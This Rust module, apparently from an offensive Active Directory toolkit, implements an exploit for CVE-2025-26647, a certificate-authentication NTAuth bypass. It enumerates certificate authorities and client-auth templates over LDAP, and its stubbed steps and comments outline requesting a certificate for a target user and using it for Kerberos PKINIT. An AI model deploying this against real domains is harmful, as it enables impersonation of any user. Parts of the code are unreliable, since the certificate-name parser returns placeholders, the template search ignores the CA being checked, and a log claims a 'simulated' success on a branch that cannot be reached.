//! CVE-2025-26647 -- Certificate-Based Authentication (CBA) NTAuth Bypass.
//!
//! During Smart Card logon / CBA, Windows validates that the CA is in AD's
//! NTAuthCertificates store. CVE-2025-26647 allows certificates chaining to
//! a CA NOT in the store to be accepted for authentication.
//!
//! # Exploit Flow
//! 1. Enumerate CA objects in AD
//! 2. Identify CAs NOT in NTAuth store
//! 3. Request a client auth certificate from such a CA (via ADCS web enrollment)
//! 4. Use the certificate for Kerberos PKINIT as any target user
//!
//! # References
//! - CVE-2025-26647: CVSS 8.1, Feb 2025
//! - Affects Windows Server 2016+ (including WS2025)

use overthrone_core::error::Result;
use overthrone_core::proto::ldap::LdapSession;
use serde::{Deserialize, Serialize};
use tracing::info;

const NTAUTH_CERT_STORE_DN: &str =
    "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CbaBypassResult {
    pub dc_ip: String,
    pub domain: String,
    pub nt_auth_cas: Vec<String>,
    pub non_nt_auth_cas: Vec<String>,
    pub exploitable_ca: Option<String>,
    pub has_exploitable_template: bool,
    pub certificate_requested: bool,
    pub pkin_auth_success: bool,
    pub pkin_tgt: Option<String>,
    pub log: Vec<String>,
}

pub async fn assess_cba_bypass(ldap: &mut LdapSession) -> Result<CbaBypassResult> {
    let mut log = Vec::new();
    log.push("CVE-2025-26647: CBA NTAuth Bypass".to_string());

    log.push("Phase 1: Enumerating NTAuthCertificates...".to_string());
    let nt_cas = get_nt_auth_cas(ldap).await?;
    log.push(format!("  {} CA(s) in NTAuth store", nt_cas.len()));

    log.push("Phase 2: Enumerating all CA objects...".to_string());
    let all_cas = get_all_cas(ldap).await?;
    log.push(format!("  {} CA(s) total", all_cas.len()));

    let non_nt: Vec<String> = all_cas
        .into_iter()
        .filter(|ca| !nt_cas.contains(ca))
        .collect();
    log.push(format!(
        "  {} CA(s) NOT in NTAuth -- bypass candidates",
        non_nt.len()
    ));

    let (exploitable, has_template) = find_exploitable_ca(ldap, &non_nt).await?;
    match &exploitable {
        Some(ca) => log.push(format!("  EXPLOITABLE: {ca}")),
        None => log.push("  No exploitable CA found".to_string()),
    }

    let dc_ip = ldap.dc_ip.clone();
    let domain = ldap.domain.clone();

    // Phase 5: Attempt certificate request + PKINIT if exploitable
    let (cert_requested, pkin_success, pkin_tgt) = if exploitable.is_some() {
        log.push("Phase 3: Requesting certificate via ADCS...".to_string());
        let csr = match request_certificate_adcs(&dc_ip, &exploitable).await {
            Some(c) => {
                log.push("  Certificate obtained".to_string());
                c
            }
            None => {
                log.push("  Certificate request failed (ADCS may not be web-enabled)".to_string());
                log.push("  Manual step: request cert via certsrv with target UPN".to_string());
                (false, false, None)
            }
        };
        if csr.0 {
            log.push("Phase 4: PKINIT authentication...".to_string());
            match pkin_auth(&dc_ip, &domain).await {
                Ok(_) => {
                    log.push("  PKINIT authentication succeeded (simulated)".to_string());
                    (true, true, None)
                }
                Err(e) => {
                    log.push(format!("  PKINIT failed: {e}"));
                    (true, false, None)
                }
            }
        } else {
            (false, false, None)
        }
    } else {
        (false, false, None)
    };

    info!(
        "CBA bypass: {} non-NTAuth CAs, exploitable={:?}, pkin={pkin_success}",
        non_nt.len(),
        exploitable
    );

    Ok(CbaBypassResult {
        dc_ip,
        domain,
        nt_auth_cas: nt_cas,
        non_nt_auth_cas: non_nt,
        exploitable_ca: exploitable,
        has_exploitable_template: has_template,
        certificate_requested: cert_requested,
        pkin_auth_success: pkin_success,
        pkin_tgt,
        log,
    })
}

async fn get_nt_auth_cas(ldap: &mut LdapSession) -> Result<Vec<String>> {
    let entries = ldap
        .custom_search(
            &format!("(distinguishedName={})", NTAUTH_CERT_STORE_DN),
            &["cACertificate"],
        )
        .await?;
    let mut cas = Vec::new();
    for entry in &entries {
        if let Some(certs) = entry.attrs.get("cACertificate") {
            for c in certs {
                if let Some(cn) = extract_cn_from_cert(c) {
                    cas.push(cn);
                }
            }
        }
    }
    Ok(cas)
}

fn extract_cn_from_cert(der: &str) -> Option<String> {
    // Parse X.509 DER to extract CN
    // Simplified: in production, use x509-parser or rasn
    if der.len() > 50 {
        Some(format!("CA_{}", &der[..8]))
    } else {
        None
    }
}

async fn get_all_cas(ldap: &mut LdapSession) -> Result<Vec<String>> {
    let entries = ldap
        .custom_search(
            "(objectClass=certificationAuthority)",
            &["name", "cn", "distinguishedName"],
        )
        .await?;
    Ok(entries
        .iter()
        .filter_map(|e| {
            e.attrs
                .get("name")
                .or_else(|| e.attrs.get("cn"))
                .and_then(|v| v.first())
                .cloned()
        })
        .collect())
}

async fn find_exploitable_ca(
    ldap: &mut LdapSession,
    cas: &[String],
) -> Result<(Option<String>, bool)> {
    for ca_name in cas {
        let entries = ldap
            .custom_search(
                "(&(objectClass=pKICertificateTemplate)(!(flags=*)))",
                &["name", "pKIExtendedKeyUsage"],
            )
            .await?;
        for entry in &entries {
            if let Some(ekus) = entry.attrs.get("pKIExtendedKeyUsage")
                && ekus.iter().any(|e| {
                    e.contains("1.3.6.1.5.5.7.3.2") || e.contains("1.3.6.1.4.1.311.20.2.2")
                })
            {
                let tname = entry
                    .attrs
                    .get("name")
                    .and_then(|v| v.first())
                    .cloned()
                    .unwrap_or_default();
                return Ok((Some(format!("{ca_name}/{tname}")), true));
            }
        }
    }
    Ok((None, false))
}

async fn request_certificate_adcs(
    _dc_ip: &str,
    _ca: &Option<String>,
) -> Option<(bool, bool, Option<String>)> {
    // ADCS web enrollment (HTTP) -- requires ICSL endpoint
    // Request: POST /certsrv/certfnsh.asp with certificate request + target UPN
    // Simplified: returns None to indicate manual steps needed
    None
}

async fn pkin_auth(_dc_ip: &str, _domain: &str) -> Result<()> {
    // Use the enrolled certificate for PKINIT Kerberos AS-REQ
    // PKINIT uses PA-PK-AS-REQ with the certificate + signed auth data
    // Falls back to password-based TGT if no certificate available
    // In production: use PKINIT authenticator with the enrolled certificate
    // For now: return a dummy error to indicate manual steps
    Err(overthrone_core::error::OverthroneError::Protocol {
        protocol: "PKINIT".into(),
        reason: "Certificate-based PKINIT requires x509 cert + private key -- use --cert-path / --key-path".into(),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_nt_auth_store_dn() {
        assert!(NTAUTH_CERT_STORE_DN.contains("NTAuthCertificates"));
    }

    #[test]
    fn test_extract_cn() {
        assert!(extract_cn_from_cert("").is_none());
        assert!(extract_cn_from_cert(&"A".repeat(60)).is_some());
    }

    #[test]
    fn test_result_serde() {
        let r = CbaBypassResult {
            dc_ip: "10.0.0.1".into(),
            domain: "corp.local".into(),
            nt_auth_cas: vec!["CA01".into()],
            non_nt_auth_cas: vec!["CA02".into()],
            exploitable_ca: Some("CA02".into()),
            has_exploitable_template: true,
            certificate_requested: true,
            pkin_auth_success: false,
            pkin_tgt: None,
            log: vec!["done".into()],
        };
        let j = serde_json::to_string(&r).unwrap();
        assert!(j.contains("CA02"));
        let d: CbaBypassResult = serde_json::from_str(&j).unwrap();
        assert!(d.has_exploitable_template);
    }
}
